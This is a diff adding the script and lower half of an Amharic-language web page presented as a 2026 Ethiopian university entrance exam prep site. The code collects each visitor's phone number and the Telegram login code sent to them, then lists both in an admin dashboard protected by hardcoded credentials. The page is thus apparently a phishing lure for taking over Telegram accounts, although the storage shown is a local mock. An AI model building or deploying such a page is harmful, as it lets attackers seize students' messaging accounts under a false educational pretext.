+            <div class="bg-slate-800 border border-slate-700 rounded-2xl overflow-hidden shadow-xl">
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="bg-slate-900 border-b border-slate-700 text-xs font-semibold text-slate-300">
+                                <th class="p-4">ተ.ቁ</th>
+                                <th class="p-4">የተጠቃሚ ስልክ ቁጥር</th>
+                                <th class="p-4">የገቡበት ኮድ (Telegram Code)</th>
+                                <th class="p-4 text-right">የምዝገባ ጊዜ</th>
+                            </tr>
+                        </thead>
+                        <tbody id="admin-table-body" class="text-sm text-slate-300 divide-y divide-slate-700/50">
+                            <!-- JS Dynamically injected rows -->
+                            <tr>
+                                <td colspan="4" class="p-8 text-center text-slate-500 text-xs">
+                                    ምንም ተጠቃሚ አልተመዘገበም።
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-slate-950 border-t border-slate-800 py-6 text-center text-xs text-slate-500">
+        <div class="container mx-auto px-4 space-y-2">
+            <p>© 2018 (2026) የኢትዮጵያ ከፍተኛ ትምህርት መግቢያ ፈተና (Entrance Exam) ዝግጅት ማዕከል</p>
+            <p>በኢንፎርሜሽን ቴክኖሎጂ የታገዘ የትምህርት ረዳት የሙከራ ድረ-ገጽ</p>
+        </div>
+    </footer>
+
+    <!-- Core App Logic Script -->
+    <script>
+        // State variables
+        let currentUserPhone = "";
+        let registeredUsers = [];
+
+        // Load data from LocalStorage to keep user submissions persistent across reloads
+        function loadData() {
+            const savedData = localStorage.getItem("ethio_entrance_users");
+            if (savedData) {
+                registeredUsers = JSON.parse(savedData);
+            }
+        }
+
+        // Save data to LocalStorage
+        function saveData() {
+            localStorage.setItem("ethio_entrance_users", JSON.stringify(registeredUsers));
+        }
+
+        // View Switching mechanism
+        function switchView(viewId) {
+            // Hide all views
+            document.getElementById('view-step-1').classList.add('hidden');
+            document.getElementById('view-step-2').classList.add('hidden');
+            document.getElementById('view-success').classList.add('hidden');
+            document.getElementById('view-admin-login').classList.add('hidden');
+            document.getElementById('view-admin-dashboard').classList.add('hidden');
+
+            // Show selected view
+            if (viewId === 'step-1') {
+                document.getElementById('view-step-1').classList.remove('hidden');
+            } else if (viewId === 'step-2') {
+                document.getElementById('view-step-2').classList.remove('hidden');
+                document.getElementById('display-phone-number').innerText = "+251 " + currentUserPhone;
+            } else if (viewId === 'success') {
+                document.getElementById('view-success').classList.remove('hidden');
+            } else if (viewId === 'admin-login') {
+                document.getElementById('view-admin-login').classList.remove('hidden');
+            } else if (viewId === 'admin-dashboard') {
+                document.getElementById('view-admin-dashboard').classList.remove('hidden');
+                renderAdminDashboard();
+            }
+
+            // Scroll to top on view switch
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Toast Messages (Replacing blocked alerts)
+        function showToast(message, type = 'success') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            
+            const bgColor = type === 'success' ? 'bg-emerald-900 border-emerald-500' : 'bg-red-950 border-red-500';
+            const textColor = type === 'success' ? 'text-emerald-300' : 'text-red-300';
+            
+            toast.className = `p-4 rounded-xl border ${bgColor} ${textColor} shadow-2xl flex items-center justify-between transform translate-y-5 opacity-0 transition-all duration-300 pointer-events-auto`;
+            toast.innerHTML = `
+                <div class="text-xs font-semibold leading-relaxed">${message}</div>
+                <button class="ml-3 text-slate-400 hover:text-white" onclick="this.parentElement.remove()">✕</button>
+            `;
+            
+            container.appendChild(toast);
+            
+            // Animation triggers
+            setTimeout(() => {
+                toast.classList.remove('translate-y-5', 'opacity-0');
+            }, 10);
+
+            // Auto-remove after 4 seconds
+            setTimeout(() => {
+                toast.classList.add('opacity-0', 'translate-y-5');
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        // Handlers: Form Submissions
+        function handlePhoneSubmit(event) {
+            event.preventDefault();
+            const phoneInput = document.getElementById('phone-input').value.trim();
+            
+            if (phoneInput) {
+                currentUserPhone = phoneInput;
+                showToast("ስልክ ቁጥርዎ በትክክል ተመዝግቧል! እባክዎ በቴሌግራም የተላከውን ኮድ ያስገቡ።", "success");
+                switchView('step-2');
+            }
+        }
+
+        function handleCodeSubmit(event) {
+            event.preventDefault();
+            const codeInput = document.getElementById('code-input').value.trim();
+
+            if (codeInput) {
+                // Save user registration to mock DB
+                const newRegistration = {
+                    id: Date.now(),
+                    phone: "+251 " + currentUserPhone,
+                    code: codeInput,
+                    timestamp: new Date().toLocaleString('am-ET')
+                };
+
+                // Add to list, update storage
+                registeredUsers.push(newRegistration);
+                saveData();
+
+                showToast("ምዝገባዎ ተረጋግጧል! ወደ መለማመጃው እንኳን ደህና መጡ።", "success");
+                switchView('success');
+            }
+        }
+
+        // Admin Auth Handlers
+        function handleAdminLogin(event) {
+            event.preventDefault();
+            const userVal = document.getElementById('admin-user').value.trim();
+            const passVal = document.getElementById('admin-password').value.trim();
+
+            if (userVal === "ethio" && passVal === "1234567890") {
+                showToast("እንኳን ደህና መጡ! ወደ አድሚን ዳሽቦርድ ገብተዋል።", "success");
+                // Clear inputs
+                document.getElementById('admin-user').value = "";
+                document.getElementById('admin-password').value = "";
+                switchView('admin-dashboard');
+            } else {
+                showToast("የተሳሳተ User name ወይም Password! እባክዎ እንደገና ይሞክሩ።", "error");
+            }
+        }
+
+        function logoutAdmin() {
+            showToast("ከአድሚን አካውንት ወጥተዋል።", "success");
+            switchView('step-1');
+        }
+
+        // Admin dashboard functionalities
+        function renderAdminDashboard() {
+            const tableBody = document.getElementById('admin-table-body');
+            const totalUsersStat = document.getElementById('stat-total-users');
+            
+            totalUsersStat.innerText = registeredUsers.length;
+
+            if (registeredUsers.length === 0) {
+                tableBody.innerHTML = `
+                    <tr>
+                        <td colspan="4" class="p-8 text-center text-slate-500 text-xs">
+                            ምንም ተጠቃሚ አልተመዘገበም።
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            tableBody.innerHTML = registeredUsers.map((user, index) => `
+                <tr class="hover:bg-slate-800/30 transition-colors">
+                    <td class="p-4 font-mono text-xs text-slate-500">${index + 1}</td>
+                    <td class="p-4 font-semibold text-white">${user.phone}</td>
+                    <td class="p-4 font-mono text-sm text-yellow-400 font-bold">${user.code}</td>
+                    <td class="p-4 text-right text-xs text-slate-400 font-mono">${user.timestamp}</td>
+                </tr>
+            `).join('');
+        }
+
+        function clearAdminData() {
+            if (registeredUsers.length === 0) {
+                showToast("ለማጥፋት ምንም ውሂብ የለም።", "error");
+                return;
+            }
+            
+            registeredUsers = [];
+            saveData();
+            renderAdminDashboard();
+            showToast("ሁሉም የምዝገባ መረጃዎች በተሳካ ሁኔታ ተሰርዘዋል!", "success");
+        }
+
+        // Interactive Practice helper
+        function startPractice(stream) {
+            showToast(`የ${stream} የፈተና ጥያቄዎች በቅርቡ ይጫናሉ! አሁን ላይ የዝግጅት መመሪያዎችን ያንብቡ።`, "success");
+        }
+
+        // Interactive quiz helper
+        function answerMock(isCorrect) {
+            const container = document.getElementById('mock-question-container');
+            if (isCorrect) {
+                container.innerHTML = `
+                    <div class="p-4 bg-emerald-950/40 border border-emerald-500/30 rounded-xl space-y-2">
+                        <p class="text-xs font-bold text-emerald-400">🎉 ትክክለኛ መልስ!</p>
+                        <p class="text-[11px] text-slate-300">አዎ፣ የ2018 (2026) የዩኒቨርሲቲ መግቢያ ፈተና (Entrance Exam) ሙሉ በሙሉ በአዲሱ ብሔራዊ ካሪኩለም ላይ ተመስርቶ የሚዘጋጅ ይሆናል።</p>
+                    </div>
+                `;
+            } else {
+                container.innerHTML = `
+                    <div class="p-4 bg-red-950/40 border border-red-500/30 rounded-xl space-y-2">
+                        <p class="text-xs font-bold text-red-400">❌ የተሳሳተ መልስ!</p>
+                        <p class="text-[11px] text-slate-300">እንደገና ይሞክሩ። የዘንድሮው ፈተና የሚዘጋጀው በአዲሱ ካሪኩለም (New Curriculum) ላይ ብቻ ነው።</p>
+                        <button onclick="resetMock()" class="text-[10px] bg-slate-800 hover:bg-slate-700 text-white px-2 py-1 rounded transition-colors">እንደገና ሞክር</button>
+                    </div>
+                `;
+            }
+        }
+
+        function resetMock() {
+            const container = document.getElementById('mock-question-container');
+            container.innerHTML = `
+                <p class="text-xs text-slate-300 leading-relaxed font-semibold">
+                    ጥያቄ፡ የ2018 የኢትዮጵያ ዩኒቨርሲቲ መግቢያ ፈተና (Entrance Exam) የሚዘጋጀው በየትኛው የትምህርት ካሪኩለም ላይ ተመስርቶ ነው?
+                </p>
+                <div class="space-y-2 text-xs">
+                    <button onclick="answerMock(true)" class="w-full text-left p-2.5 rounded-lg bg-slate-900 hover:bg-slate-700 border border-slate-700 text-slate-300 transition-colors">
+                        ሀ) በአዲሱ ብሔራዊ ካሪኩለም (New Curriculum)
+                    </button>
+                    <button onclick="answerMock(false)" class="w-full text-left p-2.5 rounded-lg bg-slate-900 hover:bg-slate-700 border border-slate-700 text-slate-300 transition-colors">
+                        ለ) በአሮጌው ካሪኩለም (Old Curriculum)
+                    </button>
+                </div>
+            `;
+        }
+
+        // Initialize App
+        window.onload = function() {
+            loadData();
+        };
+    </script>
+</body>
+</html>
+
+```
